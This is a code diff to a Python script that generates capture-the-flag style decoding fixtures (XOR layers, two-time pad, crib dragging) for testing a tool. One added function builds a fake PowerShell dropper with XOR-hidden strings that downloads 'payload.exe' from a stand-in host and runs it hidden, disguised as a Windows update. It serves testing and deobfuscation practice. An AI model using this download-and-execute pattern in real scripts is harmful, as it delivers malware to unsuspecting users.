@@ -78,6 +78,35 @@ ENGLISH = (
 )
 
 
+def xor(data: bytes, key: bytes) -> bytes:
+    """Repeating-key XOR (written here independently of ctfc, to test it)."""
+    return bytes(byte ^ key[i % len(key)] for i, byte in enumerate(data))
+
+
+def powershell_dropper() -> str:
+    """A fake PowerShell dropper whose strings are hidden with a single-byte XOR (0x5A)."""
+
+    def hidden(text: str) -> str:
+        return ",".join(f"0x{ord(char) ^ 0x5A:02x}" for char in text)
+
+    url = "http://update.example.invalid/payload.exe"
+    flag = "CYBN{fixture_powershell_layers}"
+    return (
+        "# Windows update helper - do not remove\n"
+        "$k = 0x5A\n"
+        "function Decode-String($bytes) {\n"
+        "    return -join ($bytes | ForEach-Object { [char]($_ -bxor $k) })\n"
+        "}\n"
+        f"$url = Decode-String @({hidden(url)})\n"
+        f"$tag = Decode-String @({hidden(flag)})\n"
+        "$client = New-Object System.Net.WebClient\n"
+        '$path = Join-Path $env:TEMP "update.exe"\n'
+        "$client.DownloadFile($url, $path)\n"
+        "Start-Process -FilePath $path -WindowStyle Hidden\n"
+        'Write-Output "Update finished, please restart the computer when you can."\n'
+    )
+
+
 def main() -> None:
     FIXTURES.mkdir(exist_ok=True)
     print(f"writing fixtures to {FIXTURES}")
@@ -113,7 +142,7 @@ def main() -> None:
 
     # Zero-width steganography in normal text
     cover = "Nothing to see here, just a normal sentence about the weather."
-    write("zero_width.txt", hide_zero_width(cover, b"CYBN{zw}"))
+    write("zero_width.txt", hide_zero_width(cover, b"CYBN{zero_width}"))
 
     # Binary with crypto constants: TEA delta (LE) and the AES S-box
     sbox_start = bytes.fromhex("637c777bf26b6fc53001672bfed7ab76")
@@ -124,6 +153,29 @@ def main() -> None:
     xor_key = b"x0rK3y"
     xored = bytes(byte ^ xor_key[i % len(xor_key)] for i, byte in enumerate(ENGLISH.encode()))
     write("xor_repeating.bin", xored)
+
+    # --- XOR (M2) ---
+    write("xor_single_byte.bin", xor(ENGLISH.encode(), b"\x5a"))
+    # Two layers: repeating key "secret", then the single byte 0x42
+    write("xor_two_layers.bin", xor(xor(ENGLISH.encode(), b"secret"), b"\x42"))
+    # A PNG file XORed with a 4-byte key: the PNG header is the known plaintext
+    write("xor_png.bin", xor(tiny_png() + RNG.randbytes(64), b"k3y!"))
+    # Multi-layer: text -> XOR -> zlib -> base64 (decode: base64, zlib, XOR)
+    layered = xor(ENGLISH.replace("xor_repeating", "multi_layer").encode(), b"K3y!")
+    write("layers_b64_zlib_xor.txt", base64.b64encode(zlib.compress(layered)) + b"\n")
+    # PowerShell dropper: strings XORed with 0x5A inside, whole script XORed
+    # with a repeating key, then base64
+    script = powershell_dropper().encode()
+    write("powershell_xor.b64", base64.b64encode(xor(script, b"Upd4t3r!")) + b"\n")
+    # Two messages encrypted with the same key stream (two-time pad)
+    stream = RNG.randbytes(80)
+    write(
+        "two_time_pad_1.bin", xor(b"Meet the courier at the train station tonight at nine.", stream)
+    )
+    write("two_time_pad_2.bin", xor(b"The password for the archive is written on the map.", stream))
+    # Too short for statistics: only the crib "CYBN{" can break it (key length 5)
+    short = b"Here is what you wanted: CYBN{crib_dragging_works} bye"
+    write("xor_short_crib.bin", xor(short, b"Qx7#9"))
 
     # 48-byte key||iv blob (AES-256-CBC), base64 encoded
     write("key_iv_blob.b64", base64.b64encode(RNG.randbytes(48)) + b"\n")
